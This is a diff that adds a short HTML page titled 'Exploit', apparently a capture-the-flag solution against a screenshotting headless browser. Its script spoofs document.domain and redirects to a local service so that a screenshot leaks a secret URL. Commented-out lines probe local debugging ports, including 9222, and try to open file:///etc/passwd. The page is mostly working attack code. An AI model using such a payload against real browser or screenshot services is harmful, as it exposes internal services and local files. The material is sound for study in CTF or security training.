@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit</title>
+</head>
+<body>
+    <pre id="urls">Hi</pre>
+    <script>
+        Object.defineProperty(document, 'domain', {
+        value: 'twitter.com'
+        });
+        // ports = [1200,1234,8876,9222];// still we are using default port 9222, players can't say, it's a guess challenge :)  
+        // for (port of ports) {
+        // const url = `http://127.0.0.1:${port}`
+        // fetch(url, {mode: 'no-cors'}).then(res => {
+        // urls.textContent += `\n${url}`
+        // })
+        // }
+        setTimeout(()=>{
+            window.location= `http://localhost:1337/c3631f36-4420-4061-9024-a914a38a5a4e`
+        },1500);
+        // now the screenshot will leak the URL!
+        // Leaked url -> http://localhost:1337/ticlucypcuxhgkmgldmzzcjbvcnhfrhgvidimna
+        // then we can replace the window.location to http://localhost:1337/ticlucypcuxhgkmgldmzzcjbvcnhfrhgvidimna
+        // window.open('file:///etc/passwd')
+        // setTimeout(()=>{
+        // window.location=`http://localhost:1337/c3631f36-4420-4061-9024-a914a38a5a4e`
+        // },2000);
+    </script>
+
+</body>
+</html>28
